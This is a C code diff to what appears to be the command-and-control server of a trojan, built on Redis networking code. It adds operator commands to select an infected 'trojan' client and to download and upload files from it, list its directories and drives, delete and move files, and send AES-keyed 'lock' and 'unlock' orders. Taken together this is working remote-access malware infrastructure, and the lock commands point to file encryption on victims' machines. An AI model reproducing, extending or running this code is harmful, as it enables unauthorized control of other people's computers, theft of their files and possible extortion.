@@ -15,14 +15,20 @@
 void type##Command(client *c) {\
 	client *cl = genericGetClient(c);\
 	if(cl == NULL){\
-		addReply(c, shared.err);\
+		addReplySds(c, sdsnew("-ERR CAN'T FIND CLIENT.\r\n"));\
 		return;\
 	}\
 \
-	addReply(cl, shared.mbulkhdr[value]);\
+	addReply(cl, shared.mbulkhdr[(value)]);\
 	addReplyBulkCString(cl, ""#type);\
-	for(int i = 1; i < value; i++) \
-		addReplyBulkCString(cl, c->argv[i + 1]->ptr);\
+	if(c->cur_trojan){\
+		for(int i = 1; i < (value); i++) \
+			addReplyBulkCString(cl, c->argv[i]->ptr);\
+	}\
+	else{\
+		for(int i = 1; i < (value); i++) \
+			addReplyBulkCString(cl, c->argv[i + 1]->ptr);\
+	}\
 \
 	addReply(c, shared.ok);\
 \
@@ -34,7 +40,7 @@ client* genericGetClient(client* c){
 	listNode *ln;
 	listIter li;
 
-	if(c->enable_client != true || c->is_control != true || c->argv[1]->type != OBJ_STRING){
+	if(c->enable_client != true || c->is_control != true){
 		addReply(c, shared.err);
 		return NULL;
 	}
@@ -43,16 +49,65 @@ client* genericGetClient(client* c){
 	listRewind(server.clients, &li);
 	while((ln = listNext(&li))){
 		cl = listNodeValue(ln);
-		if(!cl || !cl->hashid){
+		if(!cl || !cl->hashid || cl->enable_client==false){
 			cl = NULL;
 			continue;
 		}
-		if(!strcasecmp(c->argv[1]->ptr, cl->hashid)){
+		if(c->cur_trojan && !strcasecmp(c->cur_trojan, cl->hashid)){
+			break;
+		}
+		if(!c->cur_trojan && c->argc >=2 && !strcasecmp(c->argv[1]->ptr, cl->hashid)){
 			break;
 		}
 		cl = NULL;
 	}
 	return cl;
+}
+
+void inCommand(client *c){
+	listNode *ln;
+	listIter li;
+	long place;
+	int s = string2l(c->argv[1]->ptr, strlen(c->argv[1]->ptr), &place);
+	if(s && c->enable_client && c->is_control){
+		listRewind(server.clients, &li);
+		client *cl = NULL;
+		while((ln = listNext(&li))){
+			cl = listNodeValue(ln);
+			if(!cl || !cl->enable_client || cl->is_control || cl == c){
+				cl = NULL;
+				continue;
+			}
+			if(--place <= 0)
+				break;
+			else
+				cl = NULL;
+		}
+		if(cl == NULL){
+			addReply(c, shared.err);
+			return;
+		}
+		if(c->cur_trojan)
+			sdsfree(c->cur_trojan);
+		c->cur_trojan = sdsdup(cl->hashid);
+		addReply(c, shared.ok);
+		return;
+	}
+	addReply(c, shared.err);
+	return;
+	
+}
+
+void outCommand(client *c){
+	if(c->cur_trojan){
+		sdsfree(c->cur_trojan);
+		c->cur_trojan = NULL;
+		addReply(c, shared.ok);
+		return;	
+	}
+
+	addReply(c, shared.err);
+	return;
 }
 
 void enableCommand(client *c){
@@ -62,9 +117,10 @@ void enableCommand(client *c){
 		listRewind(server.clients, &li);
 		while((ln = listNext(&li))){
 			client *cl = listNodeValue(ln);
-			if(cl || !cl->hashid)
+			if(!cl || !cl->hashid || cl->enable_client != true)
 				continue;
 			if(!strcasecmp(c->argv[2]->ptr, cl->hashid)){
+				printf("conflict hashid: %s, client fd: %d, %d", cl->hashid, c->fd, cl->fd);
 				addReply(c, shared.err);
 				c->flags |= CLIENT_CLOSE_AFTER_REPLY;
 				return;
@@ -92,12 +148,12 @@ void getClientsCommand(client *c){
 	int hasClient = 0;
 
 	memset(buf, 0, sizeof(buf));
-	listRewind(server.clients, &li);
 	if(!c->enable_client || !c->is_control){
 		addReply(c, shared.err);
 		return;
 	}
 
+	listRewind(server.clients, &li);
 	while((ln = listNext(&li))){
 		client* cl = listNodeValue(ln);
 		if(!cl || !cl->enable_client || cl->is_control || cl == c){
@@ -124,57 +180,6 @@ void getClientsCommand(client *c){
 	return;
 }
 
-void sendCmdCommand(client *c){	
-	client *cl = genericGetClient(c);
-
-	if(cl == NULL){
-		addReply(c, shared.err);
-		return;
-	}
-	addReply(cl, shared.mbulkhdr[c->argc - 2]);
-	for(int i = 2; i < c->argc; i++){
-		addReplyBulkCString(cl, c->argv[i]->ptr);
-	}
-
-	addReply(c, shared.ok);
-}
-
-void printchar(unsigned char c){
-		switch(c){
-		case 0:
-		case 1:
-		case 2:
-		case 3:
-		case 4:
-		case 5:
-		case 6:
-		case 7:
-		case 8:
-		case 9:
-			printf("%c", c + '0');break;
-		case 10:
-			printf("a");break;
-		case 11:
-			printf("b");break;
-		case 12:
-			printf("c");break;
-		case 13:
-			printf("d");break;
-		case 14:
-			printf("e");break;
-		case 15:
-			printf("f");break;
-		}
-}
-
-void printhex(unsigned char buf[], int size){
-	for(int i = 0; i < size; i++){
-		printchar(buf[i] >> 4);
-		printchar(buf[i] & 0x0f);
-	}
-	printf("\n");
-}
-
 void lockCommand(client *c){
 	unsigned char hash[20];
 	client *cl = genericGetClient(c);
@@ -182,8 +187,12 @@ void lockCommand(client *c){
 		addReply(c, shared.err);
 		return;
 	}
-	gethashforaes(sdsnew(c->argv[1]->ptr), hash);
-	memset(hash + 16, 0 , 4);
+
+	if(c->cur_trojan)
+		gethashforaes(sdsdup(c->cur_trojan), hash);
+	else
+		gethashforaes(sdsnew(c->argv[1]->ptr), hash);
+	memset(hash + 16, 0, 4);
 
 	addReply(cl, shared.mbulkhdr[3]);
 	if(!strcasecmp(c->argv[0]->ptr, "lock"))
@@ -191,7 +200,10 @@ void lockCommand(client *c){
 	else
 		addReplyBulkCString(cl, "unlock");
 	addReplyBulkSds(cl, sdsnewlen(hash, 16));
-	addReplyBulkCString(cl, c->argv[2]->ptr);
+	if(c->cur_trojan)
+		addReplyBulkCString(cl, c->argv[1]->ptr);
+	else
+		addReplyBulkCString(cl, c->argv[2]->ptr);
 
 	addReply(c, shared.ok);
 	return;
@@ -209,44 +221,52 @@ void downloadCommand(client *c){
 		addReply(c, shared.err);
 		return;
 	}
-
-	//aeDeleteFileEvent(server.el, cl->fd, AE_READABLE | AE_WRITABLE);
-	//aeDeleteFileEvent(server.el, c->fd, AE_READABLE | AE_WRITABLE);
-	/* unregister epoll events*/
-
 	/* send cmd to the trojan client */
 	tfd = cl->fd;
 	memset(&pac, 0, sizeof(pac));
-	sprintf(pac.data, "*2\r\n$8\r\ndownload\r\n$%d\r\n%s\r\n", (int)strlen(c->argv[2]->ptr),(char*)c->argv[2]->ptr);
-	ret = write(tfd, pac.data, strlen(pac.data));
-	int flags = fcntl(tfd, F_GETFL, 0);
+	if(c->cur_trojan)
+		sprintf(pac.data, "*2\r\n$8\r\ndownload\r\n$%d\r\n%s\r\n", (int)strlen(c->argv[1]->ptr),(char*)c->argv[1]->ptr);
+	else
+		sprintf(pac.data, "*2\r\n$8\r\ndownload\r\n$%d\r\n%s\r\n", (int)strlen(c->argv[2]->ptr),(char*)c->argv[2]->ptr);
 
-	cfd = open("testdownload.txt", O_RDWR|O_CREAT, S_IRWXU|S_IRWXG|S_IRWXO);
-	fcntl(tfd, F_SETFL, 0);
-	if(ret < 0)
-		goto err;
-	if(setjmp(jmp_env))
-		goto err;
+	ret = write(tfd, pac.data, strlen(pac.data));
+
+	if(c->cur_trojan){
+		cfd = open(c->argv[1]->ptr, O_WRONLY|O_CREAT, S_IRWXU|S_IRWXG|S_IRWXO);
+		if(cfd == -1){
+			addReplySds(c, sdsnew("-ERR CAN'T CREATE FILE"));
+			return;
+		}
+	}
+	else
+		cfd = c->fd;
+
 	if(fork()==0){
+		int flags = fcntl(tfd, F_GETFL, 0);
+		fcntl(tfd, F_SETFL, 0);
+		if(setjmp(jmp_env))
+			goto err;
 		while(1){
 			memset(&pac, 0, sizeof(pac));
-			alarm(5);
+			alarm(1);
 			count = read(tfd, &pac, sizeof(pac));
 
 			if(count > 0){
 				switch(pac.type){
 				case 1:
-					ret = write(cfd, pac.data, sizeof(pac.data));
+					if(c->cur_trojan)
+						ret = write(cfd, pac.data, sizeof(pac.data));
+					else
+						ret = write(cfd, &pac, sizeof(pac));
 					if(ret < 0)
 						goto err;
 					break;
 				case 2:
-					ret = write(cfd, pac.data, sizeof(pac.data));
+					if(c->cur_trojan)
+						ret = write(cfd, pac.data, count - 1);
+					else
+						ret = write(cfd, &pac, count);
 					close(cfd);
-//					aeCreateFileEvent(server.el, cl->fd, AE_READABLE, readQueryFromClient, cl);
-//					aeCreateFileEvent(server.el, cl->fd, AE_WRITABLE, sendReplyToClient, cl);
-//					aeCreateFileEvent(server.el, c->fd, AE_READABLE, readQueryFromClient, c);
-//					aeCreateFileEvent(server.el, c->fd, AE_WRITABLE, sendReplyToClient, c);
 					fcntl(tfd, F_SETFL, flags);
 					exit(0);
 				default:
@@ -255,12 +275,11 @@ void downloadCommand(client *c){
 			}
 			else{
 err:			/* error handle*/
-//				aeCreateFileEvent(server.el, cl->fd, AE_READABLE, readQueryFromClient, cl);
-//				aeCreateFileEvent(server.el, cl->fd, AE_WRITABLE, sendReplyToClient, cl);
-//				aeCreateFileEvent(server.el, c->fd, AE_READABLE, readQueryFromClient, c);
-//				aeCreateFileEvent(server.el, c->fd, AE_WRITABLE, sendReplyToClient, c);
 				pac.type = 0;
-				ret = write(cfd, &pac.data, sizeof(pac.data));
+				if(c->cur_trojan)
+					exit(0);
+				else
+					ret = write(cfd, pac.data, sizeof(pac.data));
 				fcntl(tfd, F_SETFL, flags);
 				close(cfd);
 				exit(0);
@@ -275,52 +294,78 @@ err:			/* error handle*/
 void uploadCommand(client *c){
 	struct stat stbuf;
 	packet pac;
-	int tfd, cfd, leftcount, count, ret;
+	int  cfd, leftcount, count, ret;
 	client *cl = genericGetClient(c);
 
 	if(cl == NULL){
 		addReply(c, shared.err);
 		return;
 	}
-
-	//aeDeleteFileEvent(server.el, cl->fd, AE_READABLE | AE_WRITABLE);
-	//aeDeleteFileEvent(server.el, c->fd, AE_READABLE | AE_WRITABLE);
-	/* unregister epoll events*/
-
 	/* send cmd to the trojan client */
-	tfd = cl->fd;
 	memset(&pac, 0, sizeof(pac));
-	sprintf(pac.data, "*2\r\n$8\r\nupload\r\n$%d\r\n%s\r\n", (int)strlen(c->argv[2]->ptr),(char*)c->argv[2]->ptr);
-	ret = write(tfd, pac.data, strlen(pac.data));
-	int flags = fcntl(tfd, F_GETFL, 0);
+	if(c->cur_trojan)
+		sprintf(pac.data, "*2\r\n$6\r\nupload\r\n$%d\r\n%s\r\n", (int)strlen(c->argv[1]->ptr),(char*)c->argv[1]->ptr);
+	else
+		sprintf(pac.data, "*2\r\n$6\r\nupload\r\n$%d\r\n%s\r\n", (int)strlen(c->argv[2]->ptr),(char*)c->argv[2]->ptr);
+	ret = write(cl->fd, pac.data, strlen(pac.data));
 
-	if(setjmp(jmp_env))
-		goto err;
 	if(fork() == 0){
-		fcntl(tfd, F_SETFL, 0);
-		cfd = open("testdownload.txt", O_RDWR);
-		if(fstat(cfd, &stbuf) != 0)
-			exit(0);
-		leftcount = stbuf.st_size;
+		if(c->cur_trojan){
+			cfd = open(c->argv[1]->ptr, O_RDONLY|O_TRUNC);
+			if(cfd == -1)
+				goto err;
+			if(fstat(cfd, &stbuf) != 0){
+				goto err;
+			}
+			leftcount = stbuf.st_size;
+		}
+		else
+			cfd = c->fd;
+
+		int flags = fcntl(cl->fd, F_GETFL, 0);
+		fcntl(cl->fd, F_SETFL, 0);
+		if(setjmp(jmp_env))
+			goto err;
 		while(1){
 			memset(&pac, 0, sizeof(pac));
-			alarm(5);
+			if(!c->cur_trojan){
+				while(1){
+					alarm(3);
+					memset(&pac, 0, sizeof(pac));
+					count = read(c->fd, &pac, sizeof(pac));
+					if(count <= 0)
+						goto err;
+					switch(pac.type){
+						case 1:
+							ret = write(cl->fd, &pac, sizeof(pac));
+							break;
+						case 2:
+							ret = write(cl->fd, &pac, count);
+							exit(0);
+						default:
+							goto err;
+					}
+				}
+			}
+			alarm(3);
 			count = read(cfd, &pac.data, sizeof(pac.data));
 			leftcount -= count;
 			if(count > 0){
-				if(leftcount > 0)
-					pac.type = 2;
-				else
+				if(leftcount > 0){
 					pac.type = 1;
-				ret = write(tfd, &pac, sizeof(pac));
-				if(ret < 0)
-					goto err;
+					ret = write(cl->fd, &pac, sizeof(pac));
+				}
+				else{
+					pac.type = 2;
+					ret = write(cl->fd, &pac, count + 1);
+					exit(0);
+				}
 			}
 			else{
-err:			/* error handle*/
+err:			/* error handle */
 				pac.type = 0;
-				ret = write(tfd, &pac.data, sizeof(pac.data));
-				fcntl(tfd, F_SETFL, flags);
+				ret = write(cl->fd, &pac, sizeof(pac));
+				fcntl(cl->fd, F_SETFL, flags);
 				close(cfd);
 				exit(0);
 			}
@@ -332,8 +377,7 @@ err:			/* error handle*/
 }
 
 void lsCommand(client *c){
-	int ret;
-	char buff[1024 * 16];
+	char buff[1024 * 16 * 4];
 	client *cl = genericGetClient(c);
 
 	if(cl == NULL){
@@ -342,33 +386,33 @@ void lsCommand(client *c){
 	}
 
 	sprintf(buff, "*1\r\n$2\r\nls\r\n");
-	ret = write(cl->fd, buff, strlen(buff));
-	int flags = fcntl(cl->fd, F_GETFL, 0);
+	write(cl->fd, buff, strlen(buff));
 
 	if(fork() == 0){
-		if(setjmp(jmp_env))
-			goto err;
 		fcntl(cl->fd, F_SETFL, 0);
 		memset(buff, 0, sizeof(buff));
-		alarm(3);
-		int count = read(cl->fd, buff, sizeof(buff));
-		if(count > 0){
-			ret = write(c->fd, buff, strlen(buff));
-			if(ret < 0)
-				goto err;
-			exit(0);
-		}
-err:			/* error handle*/
-		addReply(c, shared.err);
-		fcntl(cl->fd, F_SETFL, flags);
+		if(setjmp(jmp_env))
+			goto err;
+			alarm(1);
+			unsigned int count = read(cl->fd, buff, sizeof(buff));
+			if(count > 0){
+				write(c->fd, buff, strlen(buff));
+				while(count >= sizeof(buff)){
+					alarm(2);
+					count = read(cl->fd, buff, sizeof(buff));
+					write(c->fd, buff, strlen(buff));
+				}
+				exit(0);
+			}
+		/* error handle*/
+err:	write(c->fd, "-ERR\r\n", strlen("-ERR\r\n"));
 		exit(0);
 	}
 
 	return;
 }
 
-void pwdCommand(client *c){
-	int ret;
+void getDrivesCommand(client *c){
 	char buff[1024 * 16];
 	client *cl = genericGetClient(c);
 
@@ -377,27 +421,22 @@ void pwdCommand(client *c){
 		return;
 	}
 
-	sprintf(buff, "*1\r\n$3\r\npwd\r\n");
-	ret = write(cl->fd, buff, strlen(buff));
-	int flags = fcntl(cl->fd, F_GETFL, 0);
-
+	sprintf(buff, "*1\r\n$9\r\ngetDrives\r\n");
+	write(cl->fd, buff, strlen(buff));
 
 	if(fork() == 0){
-		if(setjmp(jmp_env))
-			goto err;
 		fcntl(cl->fd, F_SETFL, 0);
 		memset(buff, 0, sizeof(buff));
-		alarm(3);
-		int count = read(cl->fd, buff, sizeof(buff));
+		if(setjmp(jmp_env))
+			goto err;
+		alarm(1);
+		unsigned int count = read(cl->fd, buff, sizeof(buff));
 		if(count > 0){
-			ret = write(c->fd, buff, strlen(buff));
-			if(ret < 0)
-				goto err;
+			write(c->fd, buff, strlen(buff));
 			exit(0);
 		}
-err:			/* error handle*/
-		addReply(c, shared.err);
-		fcntl(cl->fd, F_SETFL, flags);
+		/* error handle*/
+err:	write(c->fd, "-ERR\r\n", strlen("-ERR\r\n"));
 		exit(0);
 	}
 
@@ -418,7 +457,7 @@ generateCommandTimes(rm, 2)
 generateCommandTimes(rmdir, 2)
 generateCommandTimes(cd, 2)
 generateCommandTimes(mv, 3)
-generateCommandTimes(newdir, 2)
+generateCommandTimes(mkdir, 2)
 
 generateCommandTimes(up, 1)
 generateCommandTimes(back, 1)
